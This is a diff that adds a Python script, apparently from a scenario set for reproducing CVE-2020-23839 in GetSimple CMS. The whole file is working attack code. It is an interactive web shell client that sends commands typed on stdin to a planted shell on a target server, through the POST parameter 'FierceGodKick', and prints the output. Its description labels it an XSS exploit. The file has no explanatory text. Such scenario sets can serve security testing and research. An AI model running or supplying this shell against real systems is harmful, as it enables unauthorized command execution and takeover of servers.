+++ scenarios/CVE-2020-23839/exploit/reverse_shell.py
@@ -1,0 +1,37 @@
+import argparse
+import re
+import requests
+import sys
+
+def webshell(victim_url):
+    try:
+        WEB_SHELL = victim_url
+        getdir  = {'FierceGodKick': 'echo %CD%'}
+        r = requests.post(url=WEB_SHELL, data=getdir, verify=False)
+        status = r.status_code
+        cwd = re.findall(r'[CDEF].*', r.text)
+        if cwd:
+            while True:
+                cmd = sys.stdin.readline()
+                data = {'FierceGodKick': cmd}
+                r = requests.post(WEB_SHELL, data=data, verify=False)
+                status = r.status_code
+                if status != 200:
+                    r.raise_for_status()
+                response = r.text
+                print(response)
+        else:
+            r.raise_for_status()
+    except:
+        pass
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="CVE-2020-23839 GetSimple CMS XSS exploit")
+    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
+                        help='The IP address of the target server')
+    args = parser.parse_args()
+
+    url = 'http://' + args.server_ip
+
+    webshell(url)
